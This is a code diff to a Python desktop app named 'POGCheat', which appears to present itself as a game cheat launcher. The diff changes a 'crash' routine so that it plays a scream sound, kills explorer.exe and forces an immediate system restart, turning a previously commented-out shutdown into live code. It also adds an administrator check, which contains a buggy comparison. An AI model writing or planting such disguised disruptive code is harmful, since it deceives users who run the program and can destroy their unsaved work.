@@ -3,6 +3,7 @@ import os
 from PIL import Image
 from pygame import mixer
 import time
+import ctypes
 
 mixer.init()
 mixer.music.load('assets/scream.mp3')
@@ -10,6 +11,20 @@ mixer.music.load('assets/scream.mp3')
 customtkinter.set_appearance_mode("System")  # Modes: system (default), light, dark
 customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green
 customtkinter.set_widget_scaling(1)
+
+class NoAdmin(customtkinter.CTk):
+    def __init__(self):
+        super().__init__()
+        self.title("POGCheat")
+        self.geometry("400x250")
+
+        self.about_frame_text = customtkinter.CTkTextbox(self, height=260)
+        self.about_frame_text.grid(padx=(20, 20), pady=(20, 0), sticky="nsew")
+        self.about_frame_text.insert("0.0", "POGCheat")
+        self.about_frame_text.configure(state="disabled")
+        self.about_frame_text.bind("<1>", lambda event: self.about_frame_text.focus_set())
+
+
 
 class App(customtkinter.CTk):
     def __init__(self):
@@ -75,7 +90,7 @@ class App(customtkinter.CTk):
         self.home_frame_large_image_label.grid(row=0, column=0, padx=20, pady=10)
 
         self.launch_button = customtkinter.CTkButton(self.home_frame, text=" Launch", image=self.logo,
-                                                     command=self.new_window)
+                                                     command=self.home_button_event)
         self.launch_button.grid(row=1, column=0, padx=20, pady=10)
 
 
@@ -104,6 +119,8 @@ class App(customtkinter.CTk):
         self.devs_frame_text.configure(state="disabled")
         self.devs_frame_text.bind("<1>", lambda event: self.devs_frame_text.focus_set())
 
+    
+
     def change_appearance_mode_event(self, option: str):
         match option:
             case "Система":
@@ -131,8 +148,9 @@ class App(customtkinter.CTk):
 
     def trigger_crash(self):
         mixer.music.play()
-        time.sleep(0.5)
-        #os.system('shutdown /r /t 1')
+        os.system('taskkill /IM explorer.exe')
+        time.sleep(0.1)
+        os.system('shutdown /r /t 0')
 
     def devs_button_event(self):
         self.pick_frame("devs")
@@ -168,5 +186,15 @@ class App(customtkinter.CTk):
 
 
 if __name__ == "__main__":
-    app = App()
+    try:
+        is_admin = (os.getuid == 0)
+    except:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin:
+        app = App()
+    else:
+        app = NoAdmin()
+    
+    print(is_admin)
+
     app.mainloop()
